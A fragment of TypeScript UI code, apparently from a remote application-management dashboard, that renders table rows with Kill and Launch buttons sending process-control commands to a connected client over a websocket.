                if(confirm(`Kill ${app.name} (${pids.length} process instances)?`)) {
                    pids.forEach(pid => wsClient.sendText(activeClientId!, `kill_process ${pid}`));
                    // Optimistic update? No, let auto-refresh handle it
                }
            };
            tdAction.appendChild(btnKill);
        } else {
             // Launch Button
            const btnLaunch = document.createElement("button");
            btnLaunch.className = "btn btn-xs";
            btnLaunch.style.backgroundColor = "var(--neon-cyan)";
            btnLaunch.style.color = "black";
            btnLaunch.innerHTML = "🚀 Launch";
            btnLaunch.onclick = (e) => {
                 e.stopPropagation();
                 wsClient.sendText(activeClientId!, `start_app ${app.id}`);
            };
            tdAction.appendChild(btnLaunch);
        }

        tr.append(tdCheck, tdName, tdStatus, tdAction);
        tbody.appendChild(tr);
    });
}
